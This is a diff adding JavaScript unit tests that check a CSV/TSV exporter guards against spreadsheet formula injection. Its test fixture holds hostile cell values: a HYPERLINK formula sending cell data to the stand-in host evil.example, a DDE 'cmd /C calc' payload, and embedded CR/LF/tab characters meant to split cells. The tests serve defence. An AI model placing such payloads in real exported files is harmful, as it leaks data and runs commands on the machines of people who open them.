@@ -274,6 +274,53 @@ const csv = io.toCsv(rows);
 ok('toCsv doubles embedded quotes', csv.includes('""'));
 ok('toCsv quotes fields containing a newline', /"[^"]*\n/.test(csv));
 ok('toTsv header is tab separated', io.toTsv(rows).split('\n')[0].includes('\t'));
+
+// 数式インジェクション: 共有URL/進捗ファイル由来のセルが、読み込み側がどこで区切っても
+// 数式記号で始まるセルにならないこと。
+const FORMULA_CELL = /^[\s"]*[=+\-@＝＋－＠]/;
+function parseQuoted(text, delim) {
+  // 引用符を解釈する読み込み（Excel/LibreOffice）。引用符外の CR/LF/CRLF で行を区切る
+  const cells = [];
+  let cur = '', inQ = false;
+  for (let i = 0; i < text.length; i++) {
+    const c = text[i];
+    if (inQ) {
+      if (c === '"' && text[i + 1] === '"') { cur += '"'; i++; }
+      else if (c === '"') inQ = false;
+      else cur += c;
+    } else if (c === '"' && cur === '') inQ = true;
+    else if (c === delim || c === '\r' || c === '\n') { cells.push(cur); cur = ''; }
+    else cur += c;
+  }
+  cells.push(cur);
+  return cells;
+}
+const naiveCells = (text, seps) => text.split(new RegExp('[' + seps + '\\r\\n]'));
+const evilRow = {
+  number: '=1+1', section: '＝SUM(1)', step: '"=HYPERLINK(""https://evil.example/?d=""&F2)"',
+  expected: 'x;=1+1;y', status: 'NG', comment: 'see log\r=cmd|\' /C calc\'!A0\tx\t=1\r\n@SUM(1)\n\n-1',
+  time: ' +1', duration: 'a,=2'
+};
+const evilCsv = io.toCsv([evilRow]);
+const evilTsv = io.toTsv([evilRow]);
+const formulaCells = (cells) => cells.filter((c) => FORMULA_CELL.test(c));
+ok('toCsv: no formula cell for any reader',
+   [',', ';', '\t'].every((d) => formulaCells(parseQuoted(evilCsv, d)).length === 0) &&
+   formulaCells(naiveCells(evilCsv, ',;\\t')).length === 0,
+   JSON.stringify([',', ';', '\t'].map((d) => formulaCells(parseQuoted(evilCsv, d))).concat([formulaCells(naiveCells(evilCsv, ',;\\t'))])));
+ok('toTsv: no formula cell for any paste split',
+   formulaCells(parseQuoted(evilTsv, '\t')).length === 0 && formulaCells(naiveCells(evilTsv, ',;\\t')).length === 0,
+   JSON.stringify([formulaCells(parseQuoted(evilTsv, '\t')), formulaCells(naiveCells(evilTsv, ',;\\t'))]));
+ok('toTsv: one line per row (CR/LF/tab inside a cell do not split rows or cells)',
+   evilTsv.split('\n').length === 2 && evilTsv.split('\n')[1].split('\t').length === 8,
+   JSON.stringify(evilTsv));
+ok('toCsv: one record per row for a comma reader',
+   parseQuoted(evilCsv.split('\n')[0], ',').length === 8 && parseQuoted(evilCsv, ',').length === 16,
+   parseQuoted(evilCsv, ',').length);
+const plainRow = { number: '1-2', section: '第1節: ログイン', step: 'ID, パスワードを入力 "admin"', expected: '-5℃でも動く', status: 'OK', comment: '', time: '', duration: '0:01' };
+ok('toCsv: ordinary cells are written as before (only a leading formula char gets a quote)',
+   io.toCsv([plainRow]).split('\n')[1] === '1-2,第1節: ログイン,"ID, パスワードを入力 ""admin""",\'-5℃でも動く,OK,,,0:01',
+   io.toCsv([plainRow]).split('\n')[1]);
 ok('toMarkdownTable starts with a pipe', io.toMarkdownTable(rows).startsWith('|'));
 ok('buildBusinessReport lists the NG item', io.buildBusinessReport().includes('NG'));
 ok('exportHeaderCells returns a fresh array each call',
